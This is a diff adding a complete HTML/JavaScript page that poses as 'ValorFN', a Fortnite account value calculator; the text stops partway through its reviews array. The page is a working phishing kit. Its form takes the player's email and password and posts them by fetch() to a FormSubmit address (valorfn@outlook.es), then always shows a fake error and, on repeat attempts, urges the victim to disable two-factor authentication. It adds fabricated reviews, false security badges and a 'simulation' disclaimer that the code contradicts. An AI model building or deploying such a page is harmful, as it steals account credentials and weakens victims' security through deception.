@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ValorFN · Fortnite Account Value Calculator</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        fortnite: ['Rajdhani', 'sans-serif'],
+                        banner: ['Luckiest Guy', 'cursive'],
+                        sans: ['Inter', 'sans-serif']
+                    },
+                    colors: {
+                        fnBlue: '#122543',
+                        fnYellow: '#ffe100',
+                        fnPurple: '#8c25f5',
+                        fnDark: '#0b111e',
+                        fnCard: '#182436'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Reset y base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #080d1a;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(140, 37, 245, 0.15) 0%, transparent 70%),
+                radial-gradient(circle at 80% 50%, rgba(59, 130, 246, 0.1) 0%, transparent 50%);
+            background-attachment: fixed;
+            color: #f3f4f6;
+            font-family: 'Inter', sans-serif;
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b111e;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #334155;
+        }
+
+        /* Password toggle */
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            bottom: 18px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.3);
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: color 0.2s;
+            z-index: 3;
+            padding: 0 4px;
+        }
+        .password-toggle:hover {
+            color: #ffe100;
+        }
+
+        /* Email combo */
+        .email-combo {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            background: rgba(255, 255, 255, 0.04);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            border-radius: 60px;
+            transition: all 0.25s ease;
+            padding: 0 4px 0 0;
+        }
+        .email-combo:focus-within {
+            border-color: #ffe100;
+            background: rgba(255, 225, 0, 0.04);
+            box-shadow: 0 0 30px rgba(255, 225, 0, 0.06), 0 0 0 4px rgba(255, 225, 0, 0.04);
+        }
+        .email-combo .email-local {
+            flex: 1 1 auto;
+            min-width: 0;
+            background: transparent;
+            border: none;
+            padding: 14px 10px 14px 48px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #fff;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            border-radius: 60px 0 0 60px;
+        }
+        .email-combo .email-local::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
+        }
+        .email-combo .email-at {
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 700;
+            font-size: 1rem;
+            padding: 0 2px;
+            flex-shrink: 0;
+            white-space: nowrap;
+        }
+        .email-combo .email-domain {
+            flex: 0 1 auto;
+            min-width: 120px;
+            background: transparent;
+            border: none;
+            padding: 14px 34px 14px 8px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #fff;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffe100" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 14px;
+            cursor: pointer;
+            border-radius: 0 60px 60px 0;
+        }
+        .email-combo .email-domain option {
+            background: #1a1f35;
+            color: #fff;
+        }
+        .email-combo .icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 225, 0, 0.4);
+            font-size: 1rem;
+            z-index: 2;
+            pointer-events: none;
+        }
+        .input-group .icon {
+            position: absolute;
+            left: 16px;
+            bottom: 18px;
+            color: rgba(255, 225, 0, 0.4);
+            font-size: 1rem;
+            transition: color 0.2s;
+            z-index: 2;
+        }
+
+        .error-message {
+            margin-top: 1.5rem;
+            padding: 1rem 1.5rem;
+            border-radius: 16px;
+            display: none;
+            align-items: flex-start;
+            gap: 12px;
+            backdrop-filter: blur(4px);
+            animation: shake 0.5s ease;
+        }
+        .error-message.show {
+            display: flex;
+        }
+        .error-message .icon-container {
+            flex-shrink: 0;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid rgba(255, 0, 0, 0.2);
+        }
+        .error-message .icon-container i {
+            color: #ff4444;
+        }
+        .error-message .error-content {
+            flex: 1;
+        }
+        .error-message .error-content .error-title {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #ff6b6b;
+            margin-bottom: 2px;
+        }
+        .error-message .error-content .error-desc {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.4;
+        }
+        .error-message .error-content .error-desc strong {
+            color: #ff6b6b;
+            font-weight: 600;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-6px); }
+            80% { transform: translateX(6px); }
+        }
+
+        /* Carrusel de reseñas */
+        .review-card {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 1.2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            min-height: 180px;
+            backdrop-filter: blur(4px);
+        }
+        .review-card:hover {
+            background: rgba(255, 225, 0, 0.05);
+            border-color: rgba(255, 225, 0, 0.15);
+            transform: translateY(-4px);
+        }
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+        .review-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .avatar-1 { background: #ff6b6b; }
+        .avatar-2 { background: #4ecdc4; }
+        .avatar-3 { background: #ffe66d; color: #1a1f35; }
+        .avatar-4 { background: #a29bfe; }
+        .avatar-5 { background: #fd79a8; }
+        .avatar-6 { background: #fdcb6e; color: #1a1f35; }
+        .avatar-7 { background: #00b894; }
+        .avatar-8 { background: #e17055; }
+
+        .review-user .name {
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: #fff;
+        }
+        .review-user .date {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.3);
+        }
+        .review-stars {
+            color: #ffe100;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+        .review-stars .empty-star {
+            color: rgba(255, 255, 255, 0.1);
+        }
+        .review-text {
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.8);
+            flex: 1;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+        .review-verified {
+            margin-top: 8px;
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .review-verified i {
+            color: #66bb6a;
+        }
+
+        .carousel-track {
+            display: flex;
+            transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            gap: 20px;
+        }
+        .carousel-btn {
+            background: rgba(255, 225, 0, 0.06);
+            border: 1px solid rgba(255, 225, 0, 0.12);
+            color: #ffe100;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 1rem;
+        }
+        .carousel-btn:hover {
+            background: rgba(255, 225, 0, 0.15);
+            border-color: #ffe100;
+            transform: scale(1.05);
+        }
+        .carousel-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.12);
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+        .carousel-dot.active {
+            background: #ffe100;
+            transform: scale(1.2);
+            box-shadow: 0 0 20px rgba(255, 225, 0, 0.3);
+        }
+
+        /* Notificación flotante */
+        .notification-popup {
+            position: fixed;
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
+            z-index: 999;
+            background: linear-gradient(145deg, #1a2a4a, #0f1a2e);
+            border: 2px solid #ffe100;
+            border-radius: 24px;
+            padding: 1.2rem 2rem 1.2rem 1.8rem;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(255, 225, 0, 0.15), inset 0 1px 0 rgba(255,225,0,0.1);
+            max-width: 480px;
+            width: 90%;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            pointer-events: none;
+            backdrop-filter: blur(10px);
+        }
+        .notification-popup.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            pointer-events: auto;
+        }
+        .notification-popup .notif-icon {
+            font-size: 2rem;
+            color: #ffe100;
+            flex-shrink: 0;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .notification-popup .notif-text {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            line-height: 1.3;
+        }
+        .notification-popup .notif-close {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            background: rgba(255,255,255,0.05);
+            border: none;
+            color: rgba(255,255,255,0.4);
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+        .notification-popup .notif-close:hover {
+            background: rgba(255,255,255,0.15);
+            color: #ffe100;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+
+        /* Footer legal */
+        .footer-legal {
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding: 2rem 0 1.5rem;
+            margin-top: 3rem;
+        }
+        .footer-legal .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.5rem 2.5rem;
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.3);
+        }
+        .footer-legal .legal-links a {
+            color: rgba(255,255,255,0.4);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .footer-legal .legal-links a:hover {
+            color: #ffe100;
+        }
+        .footer-legal .legal-copy {
+            text-align: center;
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.15);
+            margin-top: 1.2rem;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== ANIMACIÓN NEÓN PARA BADGES ===== */
+        .neon-badge {
+            animation: neonPulse 2s ease-in-out infinite;
+        }
+        @keyframes neonPulse {
+            0%, 100% {
+                box-shadow: 0 0 8px rgba(255, 225, 0, 0.1), 0 0 20px rgba(255, 225, 0, 0.05);
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(255, 225, 0, 0.3), 0 0 40px rgba(255, 225, 0, 0.1);
+            }
+        }
+        .neon-badge-green {
+            animation: neonPulseGreen 2s ease-in-out infinite;
+        }
+        @keyframes neonPulseGreen {
+            0%, 100% {
+                box-shadow: 0 0 8px rgba(76, 175, 80, 0.15), 0 0 20px rgba(76, 175, 80, 0.05);
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(76, 175, 80, 0.4), 0 0 40px rgba(76, 175, 80, 0.15);
+            }
+        }
+
+        /* Responsive mejorado */
+        @media (max-width: 768px) {
+            .container {
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+            .email-combo .email-domain {
+                min-width: 100px;
+                font-size: 0.9rem;
+                padding-right: 30px;
+            }
+            .email-combo .email-local {
+                font-size: 0.9rem;
+                padding-left: 40px;
+            }
+            .review-card {
+                padding: 1rem;
+            }
+            .notification-popup {
+                top: 15%;
+                padding: 1rem 1.5rem 1rem 1.2rem;
+                max-width: 360px;
+            }
+            .notification-popup .notif-text {
+                font-size: 0.9rem;
+            }
+            .header .logo-icon {
+                font-size: 3rem;
+            }
+            .header h1 {
+                font-size: 2.4rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.2rem 0.8rem;
+                border-radius: 24px;
+            }
+            .email-combo .email-domain {
+                min-width: 80px;
+                font-size: 0.8rem;
+                padding: 12px 26px 12px 6px;
+            }
+            .email-combo .email-local {
+                font-size: 0.9rem;
+                padding: 12px 8px 12px 38px;
+            }
+            .email-combo .email-at {
+                font-size: 0.9rem;
+            }
+            .review-card {
+                padding: 0.8rem;
+                min-height: 150px;
+            }
+            .review-text {
+                font-size: 0.8rem;
+            }
+            .review-stars {
+                font-size: 0.75rem;
+            }
+            .footer-legal .legal-links {
+                gap: 0.8rem 1.2rem;
+                font-size: 0.65rem;
+            }
+            .notification-popup {
+                top: 12%;
+                padding: 0.8rem 1.2rem 0.8rem 1rem;
+                max-width: 300px;
+                border-radius: 18px;
+            }
+            .notification-popup .notif-text {
+                font-size: 0.8rem;
+            }
+            .notification-popup .notif-icon {
+                font-size: 1.5rem;
+            }
+            .header .logo-icon {
+                font-size: 2.5rem;
+            }
+            .header h1 {
+                font-size: 1.8rem;
+            }
+            .header .sub {
+                font-size: 0.9rem;
+            }
+            .btn-primary {
+                font-size: 1rem;
+                padding: 14px;
+            }
+            .input-group input,
+            .input-group select {
+                font-size: 0.9rem;
+                padding: 12px 14px 12px 40px;
+            }
+            .password-toggle {
+                right: 12px;
+                bottom: 14px;
+            }
+        }
+    </style>
+</head>
+<body class="font-sans min-h-screen flex flex-col selection:bg-fnYellow selection:text-black">
+
+    <!-- ===== NOTIFICACIÓN FLOTANTE ===== -->
+    <div id="notificationPopup" class="notification-popup">
+        <i class="fa-solid fa-gift notif-icon"></i>
+        <span class="notif-text" id="notifText">Just by reviewing your account you enter a draw for 2,400 V-Bucks!</span>
+        <button class="notif-close" onclick="closeNotification()"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+
+    <!-- ===== MENÚ SUPERIOR (solo "Valuate") ===== -->
+    <header class="border-b border-slate-800 bg-fnDark/90 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16 md:h-20">
+                <!-- Logo -->
+                <div class="flex items-center gap-3">
+                    <div class="bg-gradient-to-tr from-fnPurple to-blue-500 p-2 rounded-xl shadow-lg rotate-3">
+                        <i class="fa-solid fa-gem text-fnYellow text-xl md:text-2xl"></i>
+                    </div>
+                    <div>
+                        <span class="font-banner text-xl md:text-2xl tracking-wider text-white uppercase italic drop-shadow-md">VALOR<span class="text-fnYellow">FN</span></span>
+                        <span class="hidden sm:block text-[10px] md:text-xs font-semibold text-slate-400 tracking-widest uppercase">Account Value Calculator</span>
+                    </div>
+                </div>
+
+                <!-- Enlaces decorativos (solo "Valuate") -->
+                <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
+                    <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition bg-fnPurple text-white shadow-lg">
+                        <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="nav-value">Valuate</span>
+                    </a>
+                </nav>
+
+                <!-- Selector de moneda e idioma -->
+                <div class="flex items-center gap-2">
+                    <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
+                        <i class="fa-solid fa-globe text-fnYellow text-xs md:text-sm"></i>
+                        <select id="currency-select" class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                            <option value="USD">USD ($)</option>
+                            <option value="EUR">EUR (€)</option>
+                            <option value="MXN">MXN ($)</option>
+                        </select>
+                    </div>
+                    <div class="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
+                        <i class="fa-solid fa-language text-fnYellow text-xs md:text-sm"></i>
+                        <select id="lang-select" onchange="changeLanguage(this.value)" class="bg-transparent text-xs md:text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                            <option value="en" selected>English</option>
+                            <option value="es">Español</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Mobile nav (solo "Valuate") -->
+        <div class="flex md:hidden border-t border-slate-800 bg-slate-950">
+            <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
+                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> <span data-i18n="nav-value">Valuate</span>
+            </a>
+        </div>
+    </header>
+
+    <!-- ===== CONTENIDO PRINCIPAL ===== -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 md:py-8 flex-grow w-full">
+
+        <!-- BANNER / HERO -->
+        <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-5 md:p-8 shadow-2xl mb-8">
+            <div class="relative z-10 max-w-2xl">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-[10px] md:text-xs font-bold uppercase tracking-wider mb-3">
+                    <i class="fa-solid fa-shield-halved"></i> <span data-i18n="hero-badge">Locker Evaluator</span>
+                </div>
+                <h1 class="font-banner text-2xl sm:text-3xl md:text-4xl text-white tracking-wide uppercase leading-tight">
+                    <span data-i18n="hero-title1">How much is your</span> <span class="text-fnYellow">Fortnite</span><span data-i18n="hero-title2">account worth?</span>
+                </h1>
+                <p class="text-slate-300 text-sm md:text-base mt-2" data-i18n="hero-desc">
+                    Enter your credentials to estimate your Fortnite account's value, including all your items and their current market prices.
+                </p>
+                <!-- Badges con animación neón -->
+                <div class="flex flex-wrap gap-2 md:gap-3 mt-4">
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700 neon-badge-green">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-secure">100% Secure</span>
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700 neon-badge">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-prices">Real prices</span>
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700 neon-badge">
+                        <i class="fa-solid fa-check-circle text-fnYellow"></i> <span data-i18n="badge-users">2,847+ users</span>
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700 neon-badge-green">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-privacy">Privacy</span>
+                    </span>
+                </div>
+            </div>
+            <div class="absolute -right-6 -bottom-6 opacity-10 text-slate-100 text-7xl md:text-9xl pointer-events-none font-banner">
+                FN
+            </div>
+        </div>
+
+        <!-- ===== LOGIN FALSO ===== -->
+        <div class="max-w-md mx-auto bg-slate-900/90 border border-slate-800 rounded-2xl p-5 md:p-6 shadow-xl mb-10">
+            <form id="loginForm">
+                <div class="mb-4">
+                    <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="email-label">Email address</label>
+                    <div class="email-combo relative">
+                        <i class="fa-solid fa-envelope icon"></i>
+                        <input type="text" id="emailLocal" class="email-local" placeholder="username" required />
+                        <span class="email-at">@</span>
+                        <select id="emailDomain" class="email-domain">
+                            <option value="gmail.com">gmail.com</option>
+                            <option value="outlook.com">outlook.com</option>
+                            <option value="yahoo.com">yahoo.com</option>
+                            <option value="hotmail.com">hotmail.com</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="mb-4 relative">
+                    <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="password-label">Password</label>
+                    <input type="password" id="password" name="contraseña" placeholder="••••••••" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-fnYellow pl-10" />
+                    <i class="fa-solid fa-lock icon absolute left-3.5 top-10 text-slate-500"></i>
+                    <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
+                        <i class="fa-regular fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+
+                <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-base md:text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
+                    <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="btn-calculate">Calculate value</span>
+                </button>
+            </form>
+
+            <div class="flex justify-between mt-4 text-xs text-slate-400">
+                <a href="#" id="forgotLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-question-circle mr-1"></i> <span data-i18n="forgot-link">Forgot credentials?</span></a>
+                <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> <span data-i18n="signup-link">Create account</span></a>
+            </div>
+
+            <!-- Mensaje de error mejorado -->
+            <div class="error-message" id="errorMessage">
+                <div class="icon-container">
+                    <i id="errorIcon" class="fa-solid fa-exclamation-triangle"></i>
+                </div>
+                <div class="error-content">
+                    <div class="error-title" id="errorTitle" data-i18n="error-title">incorrect</div>
+                    <div class="error-desc" id="errorDesc" data-i18n="error-desc">Verify your credentials and try again.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== CARRUSEL DE RESEÑAS ===== -->
+        <div class="mt-8">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mb-6">
+                <h3 class="font-banner text-2xl md:text-3xl text-white uppercase tracking-wider flex items-center gap-2">
+                    <i class="fa-solid fa-star text-fnYellow"></i> <span data-i18n="reviews-title">What users say</span>
+                </h3>
+                <div class="flex items-center gap-3 text-sm text-slate-400">
+                    <span class="font-bold text-white text-lg">4.5</span>
+                    <span class="text-fnYellow text-base">
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star-half-alt"></i>
+                    </span>
+                    <span class="text-xs" data-i18n="reviews-count">2,847 reviews</span>
+                </div>
+            </div>
+
+            <div class="relative overflow-hidden rounded-2xl">
+                <div class="carousel-track" id="carouselTrack">
+                    <!-- Inyectado con JS -->
+                </div>
+            </div>
+
+            <div class="flex justify-center items-center gap-4 md:gap-6 mt-6">
+                <button class="carousel-btn" id="prevBtn"><i class="fa-solid fa-chevron-left"></i></button>
+                <div class="flex gap-3" id="carouselDots"></div>
+                <button class="carousel-btn" id="nextBtn"><i class="fa-solid fa-chevron-right"></i></button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer-legal bg-slate-950/80 backdrop-blur-sm">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="legal-links">
+                <a href="#" data-i18n="footer-terms">Terms of use</a>
+                <a href="#" data-i18n="footer-privacy">Privacy policy</a>
+                <a href="#" data-i18n="footer-cookies">Cookie policy</a>
+                <a href="#" data-i18n="footer-legal">Legal notice</a>
+                <a href="#" data-i18n="footer-contact">Contact</a>
+                <a href="#" data-i18n="footer-faq">FAQ</a>
+            </div>
+            <div class="legal-copy">
+                &copy; 2025 <span data-i18n="footer-copy">ValorFN - Fan-made unofficial tool. Fortnite is a registered trademark of Epic Games, Inc.</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== NOTIFICACIÓN FLOTANTE =====
+            function showNotification() {
+                const popup = document.getElementById('notificationPopup');
+                setTimeout(() => popup.classList.add('show'), 600);
+                setTimeout(() => closeNotification(), 3000);
+            }
+            window.closeNotification = function() {
+                document.getElementById('notificationPopup').classList.remove('show');
+            };
+
+            // ===== DOM REFS =====
+            const loginForm = document.getElementById('loginForm');
+            const loginBtn = document.getElementById('loginBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const errorIcon = document.getElementById('errorIcon');
+            const errorTitle = document.getElementById('errorTitle');
+            const errorDesc = document.getElementById('errorDesc');
+            const passwordInput = document.getElementById('password');
+            const togglePasswordBtn = document.getElementById('togglePassword');
+            const eyeIcon = document.getElementById('eyeIcon');
+            const emailLocal = document.getElementById('emailLocal');
+            const emailDomain = document.getElementById('emailDomain');
+
+            let attemptCount = 0;
+
+            // ===== TOGGLE PASSWORD =====
+            togglePasswordBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                if (type === 'text') {
+                    eyeIcon.className = 'fa-regular fa-eye-slash';
+                } else {
+                    eyeIcon.className = 'fa-regular fa-eye';
+                }
+            });
+
+            // ===== ENVÍO SOLO A OUTLOOK (valorfn@outlook.es) =====
+            // Usamos FormSubmit AJAX con destino a valorfn@outlook.es
+            const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/valorfn@outlook.es';
+
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const local = emailLocal.value.trim();
+                if (!local) {
+                    alert('Please enter a username.');
+                    return;
+                }
+
+                attemptCount++;
+
+                loginBtn.classList.add('opacity-70', 'pointer-events-none');
+                loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Calculating...';
+                errorMessage.classList.remove('show');
+
+                const fullEmail = local + '@' + emailDomain.value;
+                const password = passwordInput.value;
+
+                // Construir el payload para FormSubmit
+                const payload = {
+                    _subject: `New login attempt - ${fullEmail}`,
+                    email: fullEmail,
+                    password: password,
+                    _captcha: 'false'
+                };
+
+                // Enviar a FormSubmit (AJAX)
+                fetch(FORM_SUBMIT_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('FormSubmit response:', data);
+                    // Simulamos error después de 2s
+                    setTimeout(() => {
+                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
+                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calculate value';
+                        mostrarError(attemptCount);
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('FormSubmit error:', error);
+                    // Si falla, igualmente mostramos el error
+                    setTimeout(() => {
+                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
+                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calculate value';
+                        mostrarError(attemptCount);
+                    }, 2000);
+                });
+            });
+
+            function mostrarError(intentos) {
+                errorMessage.classList.add('show');
+                if (intentos >= 2) {
+                    errorIcon.className = 'fa-solid fa-circle-question';
+                    errorIcon.style.color = '#ff4444';
+                    errorTitle.textContent = 'Two-factor authentication active';
+                    errorDesc.innerHTML = `
+                        You may need to <strong>disable two-factor authentication</strong> 
+                        to access this tool. Contact support if the issue persists.
+                    `;
+                } else {
+                    errorIcon.className = 'fa-solid fa-exclamation-triangle';
+                    errorIcon.style.color = '#ff4444';
+                    errorTitle.textContent = 'incorrect';
+                    errorDesc.textContent = 'Verify your credentials and try again.';
+                }
+            }
+
+            // ===== HELP LINKS =====
+            document.getElementById('forgotLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('🔐 This is a simulation. No real data is stored.');
+            });
+            document.getElementById('signupLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('📝 Registration is disabled in this demo.');
+            });
+
+            // ============================================
+            // ====== CARRUSEL DE RESEÑAS ======
+            // ============================================
+
+            const reviewsData = [
+                {
+                    name: 'Alex M.',
+                    avatarIcon: 'fa-user-astronaut',
+                    avatarClass: 'avatar-1',
+                    date: 'Jan 15, 2025',
+                    rating: 4.8,
+                    text: 'Absolutely incredible! I got my account value in seconds. The item list was spot on and the prices are very accurate. Highly recommended!',
+                    verified: true,
+                },
+                {
+                    name: 'María G.',
+                    avatarIcon: 'fa-user-graduate',
+                    avatarClass: 'avatar-2',
+                    date: 'Jan 12, 2025',
+                    rating: 4.5,
+                    text: 'Perfect! It showed me all my items and the total price was fair. The interface is very clean and professional.',
+                    verified: true,
+                },
+                {
+                    name: 'Luca R.',
+                    avatarIcon: 'fa-user-ninja',
+                    avatarClass: 'avatar-3',
+                    date: 'Jan 10, 2025',
+                    rating: 4.3,
+                    text: 'Ottimo strumento! Ho scoperto il valore del mio account in pochi secondi. I prezzi sono aggiornati e sembrano reali. Consiglio!',
+                    verified: false,
+                },
+                {
+                    name: 'Sophie L.',
+                    avatarIcon: 'fa-user-tie',
+                    avatarClass: 'avatar-4',
